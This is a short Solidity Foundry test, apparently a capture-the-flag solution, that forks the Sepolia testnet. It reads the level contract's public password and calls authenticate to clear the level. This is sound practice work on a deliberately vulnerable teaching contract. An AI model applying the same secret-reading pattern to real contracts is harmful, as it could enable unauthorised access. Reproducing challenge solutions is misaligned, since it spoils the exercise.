// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

import "../instance/Level00.sol";
import "forge-std/Test.sol";

contract ExploitLevel00 is Test {
    ILevel0 level0 = ILevel0(0xdBF90CF9aC26b2E2737ED1305eff9CE6e65D7e23);

    function setUp() external {
        vm.createSelectFork("sepolia");
    }

    function testExploit() external {
        string memory password = level0.password();
        level0.authenticate(password);
        assertTrue(level0.getCleared());
    }
}
